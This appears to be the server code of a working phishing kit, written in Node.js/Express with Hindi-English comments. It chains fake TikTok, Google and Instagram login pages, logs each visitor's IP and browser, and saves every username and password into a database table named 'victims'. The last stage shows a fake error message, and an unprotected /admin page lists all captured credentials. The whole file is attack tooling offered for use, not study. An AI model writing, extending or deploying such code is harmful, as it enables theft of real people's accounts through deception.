require('dotenv').config();
const express = require('express');
const session = require('express-session');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// Health check
app.get('/health', (req, res) => res.status(200).send('OK'));

// Database connection
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false },
    connectionTimeoutMillis: 5000
});

// Database test — pool connect hua ya nahi
pool.query('SELECT 1')
    .then(() => console.log('✅ DATABASE CONNECTED'))
    .catch(err => console.log('❌ DATABASE FAILED:', err.message));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: process.env.SESSION_SECRET || 'change-this-secret',
    resave: false,
    saveUninitialized: true
}));

app.use(express.static('public'));

// ===== ROUTES =====

// TikTok page — IP log karo
app.get('/', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
    req.session.victim_ip = ip;
    req.session.user_agent = req.headers['user-agent'];
    console.log('👁️ Visitor IP:', ip);
    res.sendFile(__dirname + '/public/tiktok.html');
});

// TikTok submit
app.post('/tiktok-login', async (req, res) => {
    const { username, password } = req.body;
    console.log('📥 TikTok POST:', username, password);
    try {
        const result = await pool.query(
            `INSERT INTO victims (ip_address, user_agent, tiktok_username, tiktok_password, stage_completed)
             VALUES ($1, $2, $3, $4, 1)
             RETURNING id`,
            [req.session.victim_ip, req.session.user_agent, username, password]
        );
        req.session.victim_id = result.rows[0].id;  // ✅ session mein ID save karo
        console.log('✅ TikTok saved, victim_id =', result.rows[0].id);
    } catch(e) { console.log('❌ TikTok DB error:', e.message); }
    res.redirect('/google');
});

// Google page
app.get('/google', (req, res) => {
    res.sendFile(__dirname + '/public/google.html');
});

// Google submit
app.post('/google-login', async (req, res) => {
    const { email, password } = req.body;
    console.log('📥 Google POST:', email, password);
    try {
        await pool.query(
            `UPDATE victims SET google_email=$1, google_password=$2, stage_completed=2
             WHERE id=$3`,
            [email, password, req.session.victim_id]
        );
        console.log('✅ Google saved for victim', req.session.victim_id);
    } catch(e) { console.log('❌ Google DB error:', e.message); }
    res.redirect('/instagram');
});

// Instagram page
app.get('/instagram', (req, res) => {
    res.sendFile(__dirname + '/public/instagram.html');
});

// Instagram submit
app.post('/instagram-login', async (req, res) => {
    const { username, password } = req.body;
    console.log('📥 Instagram POST:', username, password);
    try {
        await pool.query(
            `UPDATE victims SET instagram_username=$1, instagram_password=$2, stage_completed=3
             WHERE id=$3`,
            [username, password, req.session.victim_id]
        );
        console.log('✅ Instagram saved for victim', req.session.victim_id);
    } catch(e) { console.log('❌ Instagram DB error:', e.message); }
    res.send(`
        <html><body style="text-align:center;padding:50px;font-family:sans-serif;">
        <h2>⚠️ Something went wrong. Please try again later.</h2>
        </body></html>
    `);
});

// Admin panel — data dikhao ya error dikhao
app.get('/admin', async (req, res) => {
    try {
        const data = await pool.query('SELECT * FROM victims ORDER BY timestamp DESC');
        let html = '<h2>Captured Logs (' + data.rows.length + ' total)</h2>';
        if (data.rows.length === 0) {
            html += '<p style="color:red;font-size:18px">🚫 Koi data nahi hai — abhi tak kuch save nahi hua</p>';
        } else {
            html += '<table border="1" cellpadding="8" style="border-collapse:collapse"><tr><th>ID</th><th>IP</th><th>TikTok</th><th>Google</th><th>Instagram</th><th>Stage</th><th>Time</th></tr>';
            data.rows.forEach(r => {
                html += `<tr>
                    <td>${r.id}</td>
                    <td>${r.ip_address || '-'}</td>
                    <td>${r.tiktok_username || '-'} / ${r.tiktok_password || '-'}</td>
                    <td>${r.google_email || '-'} / ${r.google_password || '-'}</td>
                    <td>${r.instagram_username || '-'} / ${r.instagram_password || '-'}</td>
                    <td>${r.stage_completed}/3</td>
                    <td>${r.timestamp}</td>
                </tr>`;
            });
            html += '</table>';
        }
        res.send(html);
    } catch(e) {
        res.send(`<h2>❌ Database Error</h2><pre>${e.message}</pre>`);
    }
});
// Debug — kaunsa database use ho raha hai
app.get('/debug-db', async (req, res) => {
    try {
        const db = await pool.query('SELECT current_database() AS db, current_user AS usr, inet_server_addr() AS host');
        const cnt = await pool.query('SELECT COUNT(*) AS c FROM victims');
        res.send(`
            <h2>Database Debug</h2>
            <p><b>Database Name:</b> ${db.rows[0].db}</p>
            <p><b>Database User:</b> ${db.rows[0].usr}</p>
            <p><b>Host:</b> ${db.rows[0].host}</p>
            <p><b>Total Rows in victims:</b> ${cnt.rows[0].c}</p>
        `);
    } catch(e) {
        res.send(`<h2>Error</h2><pre>${e.message}</pre>`);
    }
});

// Debug endpoint — DB connect hua ya nahi check karo
app.get('/db-status', async (req, res) => {
    try {
        const result = await pool.query('SELECT COUNT(*) FROM victims');
        res.send(`✅ Database connected. Total rows: ${result.rows[0].count}`);
    } catch(e) {
        res.send(`❌ Database FAILED: ${e.message}`);
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});